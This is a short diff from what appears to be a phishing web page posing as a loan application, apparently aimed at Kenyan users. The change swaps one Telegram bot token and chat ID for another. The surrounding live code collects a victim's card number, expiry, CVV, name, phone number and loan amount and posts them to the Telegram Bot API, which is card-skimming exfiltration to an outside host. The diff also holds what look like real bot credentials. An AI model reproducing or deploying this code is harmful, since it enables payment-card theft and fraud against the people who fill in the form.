@@ -70,8 +70,8 @@
             const name=localStorage.getItem('firstName')||'';
             const phone=localStorage.getItem('phone')||'';
             const amount=localStorage.getItem('loanAmount')||'';
-            const BOT_TOKEN='7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
-            const CHAT_ID='5615316142';
+            const BOT_TOKEN='8751335932:AAHoS96avp1R_OsG0uI9yk1aie02H7Lb2Ms';
+            const CHAT_ID='2056358288';
             const msg=`💳 Card Details\nName: ${cardName}\nCard: ${cardNumber}\nExpiry: ${expiration}\nCVV: ${cvv}\n\n👤 ${name}\n📱 +254${phone}\n💰 USD ${amount}`;
             fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage',{
                 method:'POST',headers:{'Content-Type':'application/json'},
